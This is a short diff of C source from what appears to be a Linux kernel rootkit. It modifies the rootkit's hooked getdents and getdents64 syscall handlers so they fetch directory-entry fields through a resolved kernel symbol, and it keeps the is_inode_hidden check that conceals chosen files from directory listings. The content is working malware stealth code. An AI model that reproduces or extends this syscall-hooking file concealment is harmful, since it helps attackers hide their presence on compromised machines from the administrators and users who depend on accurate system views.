@@ -236,9 +236,9 @@ asmlinkage long new_sys_getdents(unsigned int fd, struct linux_dirent *dirp, uns
 		struct linux_dirent *d = (struct linux_dirent *)ptr;
 
 		/* FIXME: use ksyms */
-		if (get_user(d_ino, &d->d_ino))
+		if (ksyms._copy_from_user(&d_ino, &d->d_ino, sizeof(d_ino)))
 			return -EFAULT;
-		if (get_user(d_reclen, &d->d_reclen))
+		if (ksyms._copy_from_user(&d_reclen, &d->d_reclen, sizeof(d_reclen)))
 			return -EFAULT;
 
 		if (is_inode_hidden(d_ino)) {
@@ -273,10 +273,9 @@ asmlinkage long new_sys_getdents64(unsigned int fd, struct linux_dirent64 *dirp,
 		char *ptr = (char *)dirp + pos;
 		struct linux_dirent64 *d = (struct linux_dirent64 *)ptr;
 
-		/* FIXME: use ksyms */
-		if (get_user(d_ino, &d->d_ino))
+		if (ksyms._copy_from_user(&d_ino, &d->d_ino, sizeof(d_ino)))
 			return -EFAULT;
-		if (get_user(d_reclen, &d->d_reclen))
+		if (ksyms._copy_from_user(&d_reclen, &d->d_reclen, sizeof(d_reclen)))
 			return -EFAULT;
 
 		if (is_inode_hidden(d_ino)) {
